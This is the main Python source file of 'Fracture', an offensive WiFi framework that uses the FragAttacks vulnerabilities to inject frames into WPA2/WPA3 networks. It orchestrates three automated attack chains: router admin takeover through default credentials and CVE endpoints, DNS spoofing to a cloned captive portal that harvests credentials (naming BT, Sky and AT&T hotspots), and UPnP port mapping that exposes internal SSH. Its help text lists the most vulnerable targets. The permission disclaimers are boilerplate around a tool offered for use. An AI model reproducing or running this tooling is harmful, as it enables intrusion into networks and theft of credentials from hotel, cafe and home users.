#!/usr/bin/env python3
"""
Fracture — FragAttacks WiFi Penetration Framework
==================================================
CVE-2020-24586 / CVE-2020-24587 / CVE-2020-24588

Three automated attack chains via 802.11 frame injection:

  Path 1  FragAttacks → Router admin interface (default creds + CVE endpoints)
  Path 2  FragAttacks → DNS injection → Cloned portal → Credential harvest
  Path 3  FragAttacks → UPnP AddPortMapping → Inbound access

Usage:
  sudo fracture -i wlan1
  sudo fracture -i wlan1 -t AA:BB:CC:DD:EE:FF
  sudo fracture -i wlan1 --path 3 --verbose
  sudo fracture -i wlan1 --scan-only
  sudo fracture --about

Only run against networks you own or have explicit written permission to test.
"""

import os, sys, time, argparse, subprocess

# ── dependency check ──────────────────────────────────────────────────────────
for pkg, apt in [("scapy",    "python3-scapy"),
                  ("requests", "python3-requests"),
                  ("bs4",      "python3-bs4"),
                  ("flask",    "python3-flask")]:
    try:
        __import__(pkg)
    except ImportError:
        print(f"[!] Missing: {pkg}  →  sudo apt install {apt}")
        sys.exit(1)

from . import tui
from .scanner  import scan
from .injector import estimate_patch_status
from .paths    import path1_router_admin, path2_portal, path3_upnp

# ── monitor mode check ────────────────────────────────────────────────────────

def check_monitor(iface: str):
    try:
        out = subprocess.check_output(
            ["iwconfig", iface], stderr=subprocess.DEVNULL, text=True
        )
        if "Monitor" not in out:
            tui.error(f"{iface} is not in monitor mode.")
            print(f"\n  Run:  sudo iwconfig {iface} mode monitor\n")
            sys.exit(1)
    except FileNotFoundError:
        tui.error("iwconfig not found.")
        sys.exit(1)

# ── target selection ─────────────────────────────────��────────────────────────

def select_target(networks, forced_bssid=None):
    if forced_bssid:
        forced_bssid = forced_bssid.lower()
        match = next((n for n in networks if n.bssid == forced_bssid), None)
        if not match:
            tui.error(f"BSSID {forced_bssid} not found in scan results.")
            sys.exit(1)
        return match
    if not networks:
        tui.error("No networks found. Is the interface in monitor mode?")
        sys.exit(1)
    tui.scan_table(networks)
    return tui.pick_target(networks)

# ── attack orchestration ──────────────────────────────────────────────────────

def run_attacks(iface: str, network, force_path: int = 0, verbose: bool = False):
    tui.clear()
    tui.print_banner()

    tui.info(f"Target  : {tui.WH}{tui.B}{network.bssid}{tui.R}  "
             f"({network.ssid})  ch {network.channel}")
    tui.info(f"Clients : {len(network.clients)}")
    tui.info(f"Enc     : {network.enc}  |  WPS: {'yes' if network.wps else 'no'}")
    tui.info(f"Portal  : {'detected' if network.portal else 'not detected'}")
    tui.info(f"Patch   : {estimate_patch_status(network.vendor, network.ssid)}")
    print()

    if not network.clients:
        tui.warn("No clients currently associated — injection targets limited to broadcast.")

    results = {}

    run_p2 = network.portal or force_path == 2
    paths_to_run = (
        [force_path] if force_path
        else ([1, 2, 3] if run_p2 else [1, 3])
    )

    for path_num in paths_to_run:
        if path_num == 1:
            results[1] = path1_router_admin(iface, network, verbose=verbose)

        elif path_num == 2:
            if not network.portal:
                tui.warn("Path 2: no portal detected — attempting anyway")
            portal_url = _resolve_portal_url(network)
            if portal_url:
                creds = path2_portal(iface, network, portal_url, verbose=verbose)
                results[2] = creds is not None
            else:
                tui.warn("Path 2: could not resolve portal URL — skipping")
                results[2] = False

        elif path_num == 3:
            results[3] = path3_upnp(iface, network, verbose=verbose)

    _print_summary(network, results)

def _resolve_portal_url(network) -> str:
    ssid = network.ssid.lower()
    if "bt" in ssid:
        return "http://www.btopenzone.com/"
    if "sky" in ssid:
        return "http://skyhotspot.sky.com/"
    if "attwifi" in ssid:
        return "http://attwifi.com/"

    print()
    url = input(
        f"  {tui.WH}Portal URL (leave blank to skip): {tui.R}"
    ).strip()
    return url if url else None

def _print_summary(network, results: dict):
    tui.phase("RESULTS")
    tui.info(f"Target: {network.bssid}  ({network.ssid})")
    print()

    labels = {
        1: "Router admin injection",
        2: "Portal credential harvest",
        3: "UPnP port mapping",
    }

    any_success = False
    for path_num, ok in results.items():
        tui.attack_result(path_num, ok, labels.get(path_num, ""))
        if ok:
            any_success = True

    print()
    if any_success:
        tui.success("At least one path succeeded.")
    else:
        tui.warn("All paths failed or inconclusive. "
                 "Target may be fully patched or clients absent.")
    print()

# ── about ─────────────────────────────────────────────────────────────────────

def _print_about():
    from . import __version__
    tui.clear()
    tui.print_banner()
    print(f"""  {tui.WH}{tui.B}WHAT IS FRACTURE  v{__version__}{tui.R}

  Fracture exploits CVE-2020-24586/87/88 (FragAttacks) to inject arbitrary
  plaintext frames into WPA2/WPA3 networks without knowing the password.
  The A-MSDU aggregation flag in 802.11 QoS Control is not authenticated
  by CCMP/GCMP — Fracture abuses this to slip frames past encryption.

  Three attack chains run automatically based on what's found:

  {tui.RED}{tui.B}PATH 1 — Router Admin Injection{tui.R}
    Crafted HTTP requests hit the router's management interface
    (192.168.x.1 and variants) from outside. Tries default credentials
    and known unauthenticated CVE endpoints on TP-Link, D-Link, Netgear,
    ASUS. No deauth, no noise — the router sees normal-looking requests.

  {tui.RED}{tui.B}PATH 2 — DNS Injection → Cloned Portal → Credential Harvest{tui.R}
    Triggered when a captive portal is detected. Clones the real portal,
    injects spoofed DNS responses to redirect clients to our copy,
    captures submitted credentials, then authenticates legitimately.
    Targets: hotel WiFi, corporate guest networks, cafe hotspots.

  {tui.RED}{tui.B}PATH 3 — UPnP AddPortMapping{tui.R}
    Injects UPnP SSDP + SOAP commands to add a port mapping on the
    router's WAN interface. Most home routers accept these without auth.
    Result: inbound SSH forwarded to an internal client — access from
    anywhere without ever touching the WiFi password.

  {tui.WH}{tui.B}WHAT FRACTURE DOES NOT DO{tui.R}
    No deauth floods · No handshake cracking · No password brute force

  {tui.WH}{tui.B}MOST VULNERABLE TARGETS{tui.R}
    Home routers on stock firmware (TP-Link, D-Link, Netgear, ASUS)
    IoT devices — cameras, printers, smart bulbs (rarely patched)
    Networks with captive portals (hotels, cafes, airports)
    Linux kernel < 5.12.4 · Windows pre-June 2021 update

  {tui.WH}{tui.B}USAGE{tui.R}
    sudo fracture -i wlan1               full auto
    sudo fracture -i wlan1 --scan-only   scan only, no attacks
    sudo fracture -i wlan1 --path 3      UPnP path only
    sudo fracture -i wlan1 -v            verbose injection log
    sudo fracture --about                this screen

  {tui.DIM}Only run against networks you own or have explicit permission to test.{tui.R}
""")

# ── entry point ───────────────────────────────────────────────────────────────

def main():
    if os.geteuid() != 0:
        print("[!] Run as root: sudo fracture")
        sys.exit(1)

    ap = argparse.ArgumentParser(
        description="Fracture — FragAttacks WiFi penetration framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Only run against networks you own or have permission to test.",
    )
    ap.add_argument("-i", "--interface", default="wlan1",
                    help="Monitor mode interface (default: wlan1)")
    ap.add_argument("-t", "--target",    metavar="BSSID",
                    help="Lock to specific BSSID")
    ap.add_argument("--path", type=int,  choices=[1, 2, 3], default=0,
                    help="Force a specific attack path (default: try all)")
    ap.add_argument("--scan-only",       action="store_true",
                    help="Scan and display networks, then exit")
    ap.add_argument("-v", "--verbose",   action="store_true",
                    help="Show injection details")
    ap.add_argument("--about",           action="store_true",
                    help="Detailed explanation of all attack paths")
    ap.add_argument("--version",         action="version",
                    version=f"fracture {__import__('fracture').__version__}")
    ap.add_argument("--dwell",  type=float, default=0.4,
                    help="Channel dwell time in seconds (default: 0.4)")
    ap.add_argument("--rounds", type=int,   default=2,
                    help="Scan passes per channel (default: 2)")
    args = ap.parse_args()

    if args.about:
        _print_about()
        sys.exit(0)

    tui.clear()
    tui.print_banner()
    check_monitor(args.interface)

    tui.phase("SCAN")
    networks = scan(args.interface, dwell=args.dwell, rounds=args.rounds)

    if not networks:
        tui.error("No networks found.")
        sys.exit(1)

    tui.success(f"Found {len(networks)} network(s)")
    print()
    tui.scan_table(networks)

    if args.scan_only:
        sys.exit(0)

    target = select_target(networks, forced_bssid=args.target)
    tui.success(f"Target: {target.bssid}  ({target.ssid})")

    try:
        run_attacks(args.interface, target,
                    force_path=args.path, verbose=args.verbose)
    except KeyboardInterrupt:
        print(f"\n\n  {tui.DIM}Interrupted.{tui.R}\n")


if __name__ == "__main__":
    main()
